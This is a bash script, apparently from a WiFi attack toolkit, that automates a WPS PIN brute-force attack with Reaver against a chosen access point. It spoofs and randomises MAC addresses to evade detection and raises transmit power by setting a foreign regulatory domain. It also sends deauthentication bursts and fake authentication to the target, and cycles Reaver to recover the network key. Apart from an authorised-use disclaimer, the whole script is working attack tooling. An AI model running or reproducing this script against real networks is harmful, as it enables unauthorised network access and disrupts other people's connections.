#!/bin/bash
# This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public 
# License as published by the Free Software Foundation; either version 2 of the License, or any later version.
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied 
# warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
# You should have received a copy of the GNU General Public License along with this program; if not, write to the
# Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
# --------------------------------------------------------------------------------------------------------------------#

# Disclaimer:   This script is intended for use only for private study or during an authorised pentest. The author bears no responsibility for malicious or illegal use.
#               Skiddies should look elsewhere.


#
# !!!!!!!Thanks to Vulpi author of pwnstar9.0 who's scripts taught us so much!!!!!!!
##############################################
# ANSI code routines from Vulpi author of
#              PwnStar9.0 
txtrst="\e[0m"      # Text reset 
warn="\e[1;31m"     # warning		   red         
info="\e[1;34m"     # info                 blue             
q="\e[1;32m"		# questions        green
inp="\e[1;36m"	    # input variables  magenta
yel="\e[1;33m"      # typed keyboard entries
##############################################

echo -e "$info                                                                        "      
echo -e "$warn  <<< ALL EXISTING MONITOR INTERFACES $yel(i.e. mon0 mon1 etc.)$warn WILL BE CLEARED >>>"
echo -e "$q               <<<< ??Do you wish to continue....?? >>>>$txtrst"

while true

do
echo -e "$inp       Please confirm by pressing $yel(y/Y)$inp to continue...."
echo -e "         Press $yel(n/N)$inp to abort!!..Press any other key to try again:$txtrst"

  read CONFIRM
  case $CONFIRM in
    y|Y|YES|yes|Yes) break ;;
    n|N|no|NO|No)
      echo Aborting - you entered $CONFIRM
      exit
      ;;

  esac
done
echo -e "$info  You entered $CONFIRM.  Continuing ...$txtrst"
sleep 2

clear
airmon-ng stop mon5 &> /dev/null
airmon-ng stop mon4 &> /dev/null
airmon-ng stop mon3 &> /dev/null
airmon-ng stop mon2 &> /dev/null
airmon-ng stop mon1 &> /dev/null
airmon-ng stop mon0 &> /dev/null
clear

DEVTEST=ZZZ
until  [ $DEVTEST == y ] || [ $DEVTEST == Y ]; do  
echo -e "$txtrst "
clear
iwconfig
echo ""
echo -e "$q  What wireless device will you use to perform the attack$yel(i.e. wlan0,ath0 etc)$q?"
echo -e "$info    A listing of devices is shown above.$txtrst" #(DEV)
read DEV
	while true
	do
	echo ""

echo -e "$inp  You entered $yel$DEV$info type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again$txtrst"
read DEVTEST

	case $DEVTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

#####################################

clear
	while true
	do
	echo ""
echo -e "$q  Do you wish to boost your wifi device power to 30dBm?"
echo -e "$info     This routine works for the AWUSO36H and" #(AWUSO)
echo -e "$info       may work with other devices."
echo -e "$inp         Type $yel(y/Y)$inp for yes or $yel(n/N)$inp for no.$txtrst"
		read AWUSO
		case $AWUSO in
		y|Y|n|N) break ;;
		~|~~)
		echo Aborting -
		exit
		;;

		esac
		echo -e  "$warn !!!Wrong input try again!!!$txtrst"

			done


	if [ $AWUSO == y ] || [ $AWUSO == Y ]; then
		ifconfig $DEV down
		sleep 1
		iw reg set BO
		ifconfig $DEV up
		iwconfig $DEV channel 13
		iwconfig $DEV txpower 30
		iwconfig $DEV rate 1M
        	sleep 2
 
			fi

echo -e "$info  Assigning a random mac address to device.$txtrst"
        sleep 2

ifconfig $DEV down
sleep 2
macchanger -r $DEV
sleep 2
VARMAC=$(ifconfig $DEV | grep "$DEV     Link encap:Ethernet  HWaddr " | sed s/"$DEV     Link encap:Ethernet  HWaddr "//g)
sleep 2
ifconfig $DEV hw ether $VARMAC
sleep 2
ifconfig $DEV up
airmon-ng start $DEV
	sleep 2
        clear
  


MONTEST=ZZZ
until  [ $MONTEST == y ] || [ $MONTEST == Y ]; do  
echo -e "$txtrst "
clear
iwconfig
echo ""
echo -e "$q  What wireless monitor interface $yel(i.e. mon0, mon1)$q will"
echo -e "     be used by reaver?"
echo -e "$info      A listing of devices is shown above.$txtrst" #(MON)
read MON

	while true
	do
	echo ""

echo -e "$inp  You entered $yel$MON$info type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read MONTEST

	case $MONTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

#############################################################
echo -e "$info  Assigning $yel$DEV$info mac address to $yel$MON$info.$txtrst"
ifconfig $MON down
sleep 1
macchanger -m $VARMAC $MON
sleep 1
ifconfig $MON up
sleep 1
clear
echo ""
echo ""      
echo -e "$info  <<<< You will need the following information to setup this attack. >>>>"
echo ""
echo -e "$txtrst       1. Channel of target AP."
echo "       2. Mac address of target AP."
echo ""

####################################


	clear
	while true
	do
        echo ""
	echo -e "$info  Do you wish to run wash or airodump-ng to obtain this information?" #(WASHAIR)
	echo -e "$inp     Type $yel(w/W)$inp for wash, $yel(a/A)$inp for airodump-ng or"
	echo -e "       type $yel(c/C)$inp to skip a scan for a target AP and continue....$txtrst"

		read WASHAIR
		case $WASHAIR in
    		w|W|a|A|c|C) break ;;
    		~|~~)
    		echo Aborting -
    		exit
     		;;

		esac
		echo -e  "$warn !!!Wrong input try again!!!$txtrst"

			done


if [ $WASHAIR == w ] || [ $WASHAIR == W ]; then

	until [ $WASHAIR == c ] || [ $WASHAIR == C ]; do
	killall -q Eterm &> /dev/null
        sleep .2
	Eterm -g 80x30-1-210 --cmod "red" -T "WASH" -e sh -c "wash -i $MON; bash" &
	echo -e "$info  To capture a mac address from the Eterm Window type $yel "any key" $info and the"
        echo "     Eterm window will halt. Use your mouse-left click and drag across the"
        echo -e "       data required. Type $yel(Ctrl-c)$info to capture to clipboard. Now go"
        echo -e "         to the Atrophy main menu and type $yel(shift-insert)$info to insert mac address.$txtrst" #(ANYKEY)
	read ANYKEY
	killall -q wash &> /dev/null

		clear
		while true
		do
	echo ""
        echo -e "$info  If you have the mac address and channel type $yel(c/C)$inp to"
	echo -e "     continue.... or type $yel(w/W)$inp for wash to try again.$txtrst"

	read WASHAIR
	case $WASHAIR in
    	c|C|w|W) break ;;
    	~|~~)
    	exit
     	;;

  	esac
	echo -e "$warn !!!error wrong input try again!!!$txtrst"

			done

		done

	fi	

if [ $WASHAIR == a ] || [ $WASHAIR == A ]; then
		until [ $WASHAIR == c ] || [ $WASHAIR == C ]; do

	while true
	do
        echo -e "$q  Do you wish airodump-ng to scan all channels or scan a fixed channel?"
	echo -e "$inp     Type $yel(1)$inp to scan all channels or $yel(2)$inp to scan a specific channel.$txtrst" #(CHANCHO)

	read CHANCHO
	case $CHANCHO in
	1|2) break ;;
    	~|~~)
    	echo Aborting -
    	exit
     	;;

  	esac
	echo -e  "$warn !!!Wrong input try again!!!$txtrst"

		done

			if [ $CHANCHO == 1 ]; then

	killall -q Eterm &> /dev/null
	clear
        sleep .2
	Eterm -g 80x30-1-210 --cmod "red" -T "AIRODUMP-NG" -e sh -c "airodump-ng $MON; bash" &
	echo -e "$info  To capture a mac address from the Eterm Window type $yel(any key)$info and the"
        echo "     Eterm window will halt. Use your mouse-left click and drag across the"
        echo -e "       data required. Type $yel(Ctrl-c)$info to capture to clipboard. Now go"
        echo -e "         to the Atrophy main menu and type $yel(shift-insert)$info to insert mac address.$txtrst" #(ANYKEY)
	read ANYKEY
	killall -q airodump-ng &> /dev/null



	clear
	while true
	do
	echo ""

	echo -e "$info  If you have the mac address and channel type $yel(c/C)$inp to"
	echo -e "     continue... or type $yel(a/A)$inp for airodump-ng to try again.$txtrst"

	read WASHAIR
	case $WASHAIR in
	c|C|a|A) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn !!!Wrong input try again!!!$txtrst"

		done



				fi


			if [ $CHANCHO == 2 ]; then
	killall -q Eterm &> /dev/null
	#echo -e "$warn  If Eterm window was removed - ignore warning above.$txtrst"
	sleep .2

##########
clear
while true
do
echo ""
echo -e "$q  What is your target APs' channel?$txtrst" #(CHANNEL)

	read CHANNEL
	case $CHANNEL in
    	1|2|3|4|5|6|7|8|9|10|11|12|13|14) break ;;
    	~|~~)
    	echo Aborting -
    	exit
     	;;

	esac
	echo -e  "$warn !!!Wrong input try again!!!$txtrst"

	done


#########################
CHANNELTEST=ZZZ
until  [ $CHANNELTEST == y ] || [ $CHANNELTEST == Y ]; do  
clear
echo ""

echo -e "$inp  You entered $yel$CHANNEL$info type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again$txtrst"

	read CHANNELTEST
	case $CHANNELTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

        done



#########################


	Eterm -g 80x30-1-210 --cmod "red" -T "AIRODUMP-NG" -e sh -c "airodump-ng -c $CHANNEL $MON; bash" &
	echo -e "$info  To capture a mac address from the Eterm Window type $yel(any key) $info and the"
        echo "     Eterm window will halt. Use your mouse-left click and drag across the"
        echo -e "       data required. Type $yel(Ctrl-c)$info to capture to clipboard. Now go"
        echo -e "         to the main menu and type $yel(shift-insert)$info to insert mac address.$txtrst" #(ANYKEY)
	read ANYKEY
	killall -q airodump-ng &> /dev/null

	clear
	while true
	do
	echo ""
        echo -e "$info  If you have the mac address and channel type $yel(c/C)$inp to"
	echo -e "     continue... or type $yel(a/A)$inp for airodump-ng to try again.$txtrst"

	read WASHAIR
	case $WASHAIR in
    	c|C|a|A) break ;;
    	~|~~)
    	echo Aborting -
    	exit
     	;;

  	esac
	echo -e  "$warn !!!Wrong input try again!!!$txtrst"

					done

				fi
	
		done		
	fi

	
#################################

sleep .2
killall -q wash &> /dev/null
sleep .2
killall -q airodump-ng &> /dev/null
sleep 2
clear
echo ""
echo -e "$q\n  What is your target APs' mac address?" #(TARGETAP)
echo -e  "$info\n     Enter in this format ONLY(i.e. 00:11:22:33:44:55)$txtrst"
read TARGETAP
sleep 1
#### MAC Error Handling Begins ###
##################################
# Error Handling For Mac Code Entries
# Tests Length of string
# Tests  Presence of only ::::: punctuation characters
# Tests only hex charcters present

#Sets correct puntuation for test
MACPUNCT=":::::"

sleep .2

# Tests punctuation

PUNCTEST=`echo "$TARGETAP" | tr -d -c ".[:punct:]"`

sleep .2

if [ "$PUNCTEST" == "$MACPUNCT" ]

	then

	    PUNCT=1

	else

	    PUNCT=0

	fi

sleep .2

# Tests hex characters

MACALNUM=`echo "$TARGETAP" | tr -d -c ".[:alnum:]"`

sleep .2


if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

then

	ALNUM=1
else

	ALNUM=0
  fi

sleep .2

# Tests string length

if [ ${#TARGETAP} = 17 ]

then

	MACLEN=1
else

	MACLEN=0
  fi


sleep .2

# All mac variables set to ones(1)  and zeros(0)

until [ $MACLEN == 1 ] && [ $PUNCT == 1 ] && [ $ALNUM == 1 ]; do

	if [ $ALNUM == 0 ]; then
		echo -e "$warn  You are using a non-hex character.$txtrst"

			fi
	
	if [ $MACLEN == 0 ]; then
		echo -e "$warn  Your mac address is the wrong length.$txtrst"

			fi

	if [ $PUNCT == 0 ]; then

		echo -e "$warn  You have entered the wrong and/or too many separators - use ONLY colons :$txtrst"

			fi

	echo -e "$info  Mac address entry incorrect!!!"
        echo "  You must use format 00:11:22:33:44:55 or aa:AA:bb:BB:cc:CC"
	echo "  Only a thru f, A thru F, 0 thru 9 and the symbol :  are allowed."
	echo -e "$inp  Reenter mac address and try again.$txtrst" #(TARGETAP)
	read TARGETAP

        MACALNUM=`echo "$TARGETAP" | tr -d -c ".[:alnum:]"`
	if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

        then

        	ALNUM=1

        else

	        ALNUM=0

			fi

sleep .2       

	if [ ${#TARGETAP} == 17 ]

	then

		MACLEN=1
	else

		MACLEN=0

			fi

sleep .2

	PUNCTEST=`echo "$TARGETAP" | tr -d -c ".[:punct:]"`
	if [ $PUNCTEST == $MACPUNCT ]

	then

	    PUNCT=1

	else

	    PUNCT=0

			fi

sleep 1

done
  
#######Mac Error Handling Ends Whew!!#############
##################################################

clear
while true
do
echo ""
echo -e "$q  What is your target APs' channel?$txtrst" #(CHANNEL)

	read CHANNEL
	case $CHANNEL in
    	1|2|3|4|5|6|7|8|9|10|11|12|13|14) break ;;
    	~|~~)
    	echo Aborting -
    	exit
     	;;

	esac
	echo -e  "$warn !!!Wrong input try again!!!$txtrst"

	done


#########################
CHANNELTEST=ZZZ
until  [ $CHANNELTEST == y ] || [ $CHANNELTEST == Y ]; do  
clear
echo ""

echo -e "$inp  You entered $yel$CHANNEL$info type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again$txtrst"

	read CHANNELTEST
	case $CHANNELTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

        done



#########################

# killall -q Eterm &> /dev/null  #kills any airodump-ng prescan

#########################old varmacreaver starts
clear

	while true
	do
	echo ""

#### Decide to Assign mac code to wifi device

echo -e "$q  Do you wish to assign a specific mac address to your wifi device?"
echo -e "     $info Mac address will not change as Reaver is started, stopped then restarted." 
echo -e "$inp        Type $yel(y/Y)$inp for yes and $yel(n/N)$inp for no. (DEVMACTEST)$txtrst"

	read DEVMACTEST
	case $DEVMACTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

##################################Enter mac address for device

if [ $DEVMACTEST == y ] || [ $DEVMACTEST == Y ]; then

echo -e "$q\n What mac address do you wish to assign to your wifi device?" #(DEVMAC)
echo -e  "$info\n     Enter in this format ONLY(i.e. 00:11:22:33:44:55)$txtrst"
read DEVMAC
sleep 2

#### MAC Error Handling Begins ###
##################################
# Error Handling For Mac Code Entries
# Tests Length of string
# Tests  Presence of only ::::: punctuation characters
# Tests only hex charcters present

#Sets correct puntuation for test
MACPUNCT=":::::"

sleep .2

# Tests punctuation

PUNCTEST=`echo "$DEVMAC" | tr -d -c ".[:punct:]"`

sleep .2

if [ "$PUNCTEST" == "$MACPUNCT" ]

	then

	    PUNCT=1

	else

	    PUNCT=0

	fi

sleep .2

# Tests hex characters

MACALNUM=`echo "$DEVMAC" | tr -d -c ".[:alnum:]"`

sleep .2


if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

then

	ALNUM=1
else

	ALNUM=0
  fi

sleep .2

# Tests string length

if [ ${#DEVMAC} = 17 ]

then

	MACLEN=1
else

	MACLEN=0
  fi
	fi  # if [ $DEVMACTEST == y ] || [ $DEVMACTEST == Y ]; then

sleep .2

# All mac variables set to ones(1)  and zeros(0)

until [ $MACLEN == 1 ] && [ $PUNCT == 1 ] && [ $ALNUM == 1 ]; do

	if [ $ALNUM == 0 ]; then
		echo -e "$warn  You are using a non-hex character.$txtrst"

			fi
	
	if [ $MACLEN == 0 ]; then
		echo -e "$warn  Your mac address is the wrong length.$txtrst"

			fi

	if [ $PUNCT == 0 ]; then

		echo -e "$warn  You have entered the wrong and/or too many separators - use ONLY colons :$txtrst"

			fi

	echo -e "$info  Mac address entry incorrect!!!"
        echo "  You must use format 00:11:22:33:44:55 or aa:AA:bb:BB:cc:CC"
	echo "  Only a thru f, A thru F, 0 thru 9 and the symbol :  are allowed."
	echo -e "$inp  Reenter mac address and try again.$txtrst" #(DEVMAC)
	read DEVMAC

        MACALNUM=`echo "$DEVMAC" | tr -d -c ".[:alnum:]"`
	if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

        then

        	ALNUM=1

        else

	        ALNUM=0

			fi

sleep .2       

	if [ ${#DEVMAC} == 17 ]

	then

		MACLEN=1
	else

		MACLEN=0

			fi

sleep .2

	PUNCTEST=`echo "$DEVMAC" | tr -d -c ".[:punct:]"`
	if [ $PUNCTEST == $MACPUNCT ]

	then

	    PUNCT=1

	else

	    PUNCT=0

			fi

sleep 1

done
  
#######Mac Error Handling for DEVMAC Ends Whew!!#############
killall -q Eterm &> /dev/null  #kills any airodump-ng prescan
clear

##################################################DEAUTH TEST

while true
	do
	echo ""

echo -e "$q  Do you wish to send a deauth burst at the start of each cycle?"
echo -e "     $info This can help clear sticky routers." 
echo -e "$inp        Type $yel(y/Y)$inp for yes and $yel(n/N)$inp for no. (DEAUTHTEST)$txtrst"

	read DEAUTHTEST
	case $DEAUTHTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done


clear
###################################################DEAUTH TEST ENDS
while true
	do
	echo ""

echo -e "$q  Do you wish to write a log of Reaver output to file?"
echo -e "     $info This log is necessary as Reaver is started, stopped then restarted."
echo "       If log file of output not written, a key if found may be lost."
echo -e "$warn         !!Reaver output if written to file, will not be displayed on screen!!" 
echo -e "$inp        Type $yel(y/Y)$inp for yes and $yel(n/N)$inp for no. (WRITEFILE)$txtrst"

	read WRITEFILE
	case $WRITEFILE in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done


if [ $WRITEFILE == Y ]; then

	WRITEFILE=y 

	fi

if [ $WRITEFILE == N ]; then

	WRITEFILE=n

	fi

if [ $WRITEFILE == y ]; then

FILETEST=ZZZ
until  [ $FILETEST == y ] || [ $FILETEST == Y ]; do  
clear
echo ""

	echo -e "$q  What name will you give for the log file, enter file name?(LOGFILE)$txtrst"	
	read LOGFILE

	while true
	do
	echo ""

echo -e "$inp  You entered $yel$LOGFILE$info type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again$txtrst"

	read FILETEST
	case $FILETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done


	sleep 1	
	               
	fi
############################
LIVETEST=ZZZ
until  [ $LIVETEST == y ] || [ $LIVETEST == Y ]; do  
clear
echo ""

echo -e "$q  How long will Reaver run in $yel sec$q before shutdown and restart?(LIVE)$txtrst"
	read LIVE

	while true
	do
	echo ""

echo -e "$inp  You entered $yel$LIVE$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
	read LIVETEST
	case $LIVETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done


	clear
	while true
	do
	echo ""
echo -e "$info  The next choices deal with the  -r, --recurring-delay=<x:y> command"
echo "     i.e. Sleep for y seconds every x pin attempts"
echo "       You can choose to run Reaver without the -r command. In this case"
echo "          if you chose to run Reaver for 120 sec, it will stay LIVE for"
echo "            120 sec then shutdown and restart"
echo ""
echo "  If you choose to use the -r, then the program"
echo "     will send pin attempts and rest as per -r frequency. But at"
echo "        120 sec the program will shutdown and restart." 

echo -e "$q  Do you want to use a -r --recurring-delay=<x:y> command?"
echo -e "$inp    Type $yel(y/Y)$inp for yes and $yel(n/N)$inp for no:(RCHOICE).$txtrst"
	read RCHOICE   
	case $RCHOICE in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn !!!Wrong input try again!!!$txtrst"

		done


if [ $RCHOICE == Y ]; then

	RCHOICE=y 

	fi

if [ $RCHOICE == N ]; then

	RCHOICE=n

	fi

if [ $RCHOICE == y ]; then

RXTEST=ZZZ
until  [ $RXTEST == y ] || [ $RXTEST == Y ]; do  

echo ""
echo -e "$q  How many pin attempts x in -r x:y before delay y in seconds?(RX)"
echo ""
echo -e "$inp     Enter number of pin attempts x.$txtrst" #(RX) 
read RX

	while true
	do
	echo ""

echo -e "$inp  You entered $yel$RX$info type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$tstrst"
read RXTEST

	case $RXTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done


RYTEST=ZZZ
until  [ $RYTEST == y ] || [ $RYTEST == Y ]; do  

clear
echo ""
echo -e "$q  How many $yel seconds$q will Reaver sleep between pin attempts x, in -r $RX:y?"
echo ""
echo -e "$inp     Enter delay in seconds y.(RY)$txtrst"
read RY

while true
	do
	echo ""
	echo -e "$inp  You entered $yel$RY$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
	read RYTEST

	case $RYTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

			fi


COUNTTEST=ZZZ
until  [ $COUNTTEST == y ] || [ $COUNTTEST == Y ]; do  

clear
echo ""

echo -e "$q  How many times do you want the program to start,stop then restart? (COUNT)"
echo ""
echo -e "$warn     !!!!Enter a number less then 100,000!!!!$txtrst"
read COUNT
while  [ $COUNT -gt 99999 ]; do
        echo -e "$warn  !!!Please enter a number less than 100,000!!!"
	echo -e "$q     How many times do you want the program to start,stop and restart?(COUNT)$txtrst"
      	read COUNT

	done

while true
	do
	echo ""
	echo -e "$inp  You entered $yel$COUNT$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
	read COUNTTEST

	case $COUNTTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done


FN=1

let COUNTSTART=COUNT

while  [ $COUNT -gt 0 ]; do

if [ $COUNTSTART -lt 1000 ] && [ $WRITEFILE == y ]; then

	PAD=`printf "%03d\n" $FN`
	if [ $FN -gt 1 ]; then
   	let PF=FN-1
   	CF=`printf "%03d\n" $PF`
		fi	
	fi

if [ $COUNTSTART -gt 999 ] && [ $COUNTSTART -lt 10000 ] && [ $WRITEFILE == y ]; then

	PAD=`printf "%04d\n" $FN`
	if [ $FN -gt 1 ]; then
   	let PF=FN-1
   	CF=`printf "%04d\n" $PF`
		fi

	fi

if [ $COUNTSTART -gt 9999 ] && [ $COUNTSTART -lt 100000 ] && [ $WRITEFILE == y ]; then

	PAD=`printf "%05d\n" $FN`
	if [ $FN -gt 1 ]; then
   	let PF=FN-1
   	CF=`printf "%05d\n" $PF`
		fi

	fi

##################
if [ $DEVMACTEST == y ] || [ $DEVMACTEST == Y ]; then

	ifconfig $DEV down
#	macchanger -m $DEVMAC $DEV
	sleep 2
	ifconfig $DEV hw ether $DEVMAC
        sleep 2
	ifconfig $DEV up
	sleep 2
	ifconfig $MON down
	sleep 2
	macchanger -m $DEVMAC $MON
	sleep 2
	ifconfig $MON up

   fi  # if [ $DEVMACTEST == y ] || [ $DEVMACTEST == Y ]; then

#################


if [ $DEVMACTEST == n ] || [ $DEVMACTEST == N ]; then

ifconfig $DEV down
#
sleep 2
#
macchanger -r $DEV
#
sleep 2
#
VARMAC=$(ifconfig $DEV | grep "$DEV     Link encap:Ethernet  HWaddr " | sed s/"$DEV     Link encap:Ethernet  HWaddr "//g)
#
sleep 2
#
ifconfig $DEV hw ether $VARMAC
#
sleep 2
#
ifconfig $DEV up
#
ifconfig $MON down

sleep 2
macchanger -m $VARMAC $MON

sleep 2

ifconfig $MON up

	fi  # if [ $DEVMACTEST == n ] || [ $DEVMACTEST == N ]; then

sleep 2 

clear
echo ""
echo -e "$info  Starting Reaver, Airodump-ng, Aireplay"
echo -e " $info Monitor                            = $yel$MON"
echo -e " $info Channel                            = $yel$CHANNEL"
echo -e " $info Mac Address of Target AP           = $yel$TARGETAP"

if [ $DEVMACTEST == y ] || [ $DEVMACTEST == Y ]; then

echo -e " $info Assigned Mac Address               = $yel$DEVMAC"

	fi

if [ $DEVMACTEST == n ] || [ $DEVMACTEST == N ]; then


echo -e " $info Random Mac Address                 = $yel$VARMAC"

	fi


echo -e " $info Recurring-delay pin attempts x     = $yel$RX" 
echo -e " $info Recurring-delay sleep in sec y     = $yel$RY"
echo -e " $info Reaver live time                   = $yel$LIVE sec"
echo -e " $info Reaver start/stop cycles remaining = $yel$COUNT $txtrst"

if [ $WRITEFILE == y ]; then

echo "  File name being written to root    = $LOGFILE-$PAD"
echo -e "$warn  Reaver data is sent to file NOT Screen"
echo -e "$info  For latest completed file see /root/$LOGFILE-$CF"

        fi

if [ $WRITEFILE == n ]; then

echo -e "$warn  Reaver data is sent to screen not file!"
echo -e "$warn  Key if found might be lost"
echo -e "$info  If key completion above 90%,"  
echo -e "$info  suggest writing to file.
"
	fi

echo -e "  Screen will change every $LIVE seconds.$txtrst"
echo ""  
sleep 3 


#
#

if [ $DEAUTHTEST == y ] || [ $DEAUTHTEST == Y ]; then

echo -e "$info  Sending short deauth burst then pausing prior to starting reaver. $txtrst"

Eterm -g 80x10-1+10 --cmod "red" -T "AIRODUMP-NG" -e sh -c "airodump-ng -c $CHANNEL --bssid $TARGETAP $MON; bash" &
sleep .2
Eterm -g 80x10+1+10 --cmod "red" -T "AIREPLAY-NG DEAUTH" -e sh -c "aireplay-ng -0 15 -a $TARGETAP $MON; bash" &

sleep 15 # allows time for router to clear

killall -q aireplay-ng &> /dev/null
sleep .2
killall -q airodump-ng &> /dev/null
sleep .2
killall -q Eterm &> /dev/null

fi
#
Eterm -g 80x10-1+10 --cmod "red" -T "AIRODUMP-NG" -e sh -c "airodump-ng -c $CHANNEL --bssid $TARGETAP $MON; bash" &

#
Eterm -g 80x10-1+200 --cmod "red" -T "AIREPLAY-NG FAKEAUTH" -e sh -c "aireplay-ng -1 10 -a $TARGETAP $MON; bash" &

#
##################REAVER w/ varmac
if [ $RCHOICE == n ] && [ $WRITEFILE == y ] && [ $DEVMACTEST == y ] || [ $DEVMACTEST == Y ]; then

Eterm -g 80x10-1+400 --cmod "red" -T "REAVER" -e sh -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 --out-file=$LOGFILE-$PAD --mac=$VARMAC; bash" &

	fi

if [ $RCHOICE == y ] && [ $WRITEFILE == y ]  && [ $DEVMACTEST == y ] || [ $DEVMACTEST == Y ]; then

Eterm -g 80x10-1+400 --cmod "red" -T "Reaver" -e sh -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 -r $RX:$RY --out-file=$LOGFILE-$PAD --mac=$VARMAC; bash" &

	fi

if [ $RCHOICE == n ] && [ $WRITEFILE == n ]  && [ $DEVMACTEST == y ] || [ $DEVMACTEST == Y ]; then

Eterm -g 80x10-1+400 --cmod "red" -T "Reaver" -e sh -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 --mac=$VARMAC; bash" &

	fi

if [ $RCHOICE == y ] && [ $WRITEFILE == n ] && [ $DEVMACTEST == y ] || [ $DEVMACTEST == Y ]; then

Eterm -g 80x10-1+400 --cmod "red" -T "Reaver" -e sh -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 -r $RX:$RY --mac=$VARMAC; bash" &

	fi
###############################reaver with varmac ends

#############################reaver w/ DEVMAC starts
if [ $RCHOICE == n ] && [ $WRITEFILE == y ] && [ $DEVMACTEST == n ] || [ $DEVMACTEST == N ]; then

Eterm -g 80x10-1+400 --cmod "red" -T "REAVER" -e sh -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 --out-file=$LOGFILE-$PAD --mac=$DEVMAC; bash" &

	fi

if [ $RCHOICE == y ] && [ $WRITEFILE == y ]  && [ $DEVMACTEST == n ] || [ $DEVMACTEST == N ]; then

Eterm -g 80x10-1+400 --cmod "red" -T "Reaver" -e sh -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 -r $RX:$RY --out-file=$LOGFILE-$PAD --mac=$DEVMAC; bash" &

	fi

if [ $RCHOICE == n ] && [ $WRITEFILE == n ]  && [ $DEVMACTEST == n ] || [ $DEVMACTEST == N ]; then

Eterm -g 80x10-1+400 --cmod "red" -T "Reaver" -e sh -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 --mac=$DEVMAC; bash" &

	fi

if [ $RCHOICE == y ] && [ $WRITEFILE == n ] && [ $DEVMACTEST == n ] || [ $DEVMACTEST == N ]; then

Eterm -g 80x10-1+400 --cmod "red" -T "Reaver" -e sh -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 -r $RX:$RY --mac=$DEVMAC; bash" &

	fi


#########################reaver w/ DEVMAC ends ###################







seconds=$LIVE; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info  Time remaining before program restart. $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

done
echo -e "$txtrst " 
#
PIDREV=$(airmon-ng check | grep "reaver" | sed s/"(reaver) is running on interface $MON"//g)
#
PIDREV1=${PIDREV##*D }
#
kill -s SIGINT $PIDREV1
clear

# killall -q reaver &> /dev/null
sleep .2
killall -q airodump-ng &> /dev/null
sleep .2
killall -q aireplay-ng &> /dev/null
sleep .2
killall -q Eterm &> /dev/null
clear
sleep .2
#
let COUNT=COUNT-1
let FN=FN+1
#
sleep 1

done

echo "loops completed"
sleep 10
################################################################################
# Variable listing
# $DEV= wifi reciever to be used by reaver ie wlan0, wlan1, eth1 etc
#    must support packet injection     
# $DEVTYPE support exists to boost an rtl8187 alfa reciever to txpower=30mBm.
#
# $MON= when wifi reviever placed in moniter mode confirm designation
# $TARGETAP = AP to attack with reaver
# $CHANNEL = channel of $TARGETAP
# $RX = Recurring-delay pin attempts x
# $RY = Recurring-delay sleep in sec y
